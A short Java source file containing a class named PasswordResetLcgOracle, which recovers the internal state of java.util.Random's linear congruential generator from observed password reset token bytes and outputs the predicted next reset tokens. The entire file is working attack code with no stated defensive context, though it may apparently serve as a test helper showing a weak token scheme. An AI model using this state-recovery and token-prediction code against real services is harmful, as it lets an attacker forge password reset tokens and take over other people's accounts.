package com.codeja.master_acdc.identity;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.HexFormat;
import java.util.List;

final class PasswordResetLcgOracle {
  private static final long MULTIPLIER = 0x5deece66dL;
  private static final long ADDEND = 0xbL;
  private static final long MASK = (1L << 48) - 1;

  private PasswordResetLcgOracle() {}

  static List<String> predictions(String observed) {
    var outputs = ByteBuffer.wrap(HexFormat.of().parseHex(observed)).order(ByteOrder.LITTLE_ENDIAN);
    long prefix = Integer.toUnsignedLong(outputs.getInt()) << 16;
    var candidates = new ArrayList<String>();
    for (int low = 0; low < (1 << 16); low++) {
      long state = prefix | low;
      var remaining = outputs.duplicate();
      remaining.order(ByteOrder.LITTLE_ENDIAN);
      while (remaining.hasRemaining()) {
        state = next(state);
        if ((int) (state >>> 16) != remaining.getInt()) {
          break;
        }
      }
      if (!remaining.hasRemaining() && (int) (state >>> 16) == outputs.getInt(28)) {
        candidates.add(generate(state));
      }
    }
    return candidates;
  }

  private static String generate(long state) {
    var bytes = ByteBuffer.allocate(32).order(ByteOrder.LITTLE_ENDIAN);
    while (bytes.hasRemaining()) {
      state = next(state);
      bytes.putInt((int) (state >>> 16));
    }
    return HexFormat.of().formatHex(bytes.array());
  }

  private static long next(long state) {
    return (state * MULTIPLIER + ADDEND) & MASK;
  }
}
